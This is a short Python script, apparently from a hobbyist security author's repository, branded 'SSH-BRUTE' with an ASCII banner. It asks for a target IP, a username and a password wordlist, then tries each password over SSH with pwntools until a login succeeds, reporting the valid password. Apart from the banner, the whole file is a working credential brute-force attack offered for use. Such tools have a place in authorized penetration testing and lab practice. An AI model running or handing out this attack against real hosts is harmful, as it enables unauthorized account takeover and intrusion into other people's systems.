#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Define color variables
green = "\033[1;32m"
clear = "\033[0m"

# ASCII art banner
ascii = ">  \r\n"
ascii += "███████╗███████╗██╗  ██╗      ██████╗ ██████╗ ██╗   ██╗████████╗███████╗ \r\n"
ascii += "██╔════╝██╔════╝██║  ██║      ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝	\r\n"
ascii += "███████╗███████╗███████║█████╗██████╔╝██████╔╝██║   ██║   ██║   █████╗  	\r\n"
ascii += "╚════██║╚════██║██╔══██║╚════╝██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  	\r\n"
ascii += "███████║███████║██║  ██║      ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗	\r\n"
ascii += "╚══════╝╚══════╝╚═╝  ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝	\r\n"
ascii += "                                                      					\r\n"
ascii += "                                                       					\r\n"
ascii += "   		={>   C Y B E R T E C H   M A V E N   <}=           			\r\n"
ascii += "                                                       					\r\n"
ascii += "         		GitHub   : Thectechmaven                      				\r\n"
ascii += "         		Medium   : @jbtechmaven                      				\r\n"
ascii += "         		Twitter  : @CyberTechMaven                   				\r\n"

# Add colors
intro = green + ascii.replace(">", "").replace("<", "") + clear

# Print the banner
print(intro)

# https://docs.pwntools.com/en/stable/tubes/ssh.html 

from pwn import *
import paramiko

# Prompt the user for input values
host = str(input('Enter an IP address: '))
username = str(input('Enter a username: '))
password_list_path = str(input('Enter path to wordlist: '))
attempts = 0

# Use the provided wordlist path instead of hardcoding the file name
with open(password_list_path , "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid")
        attempts += 1
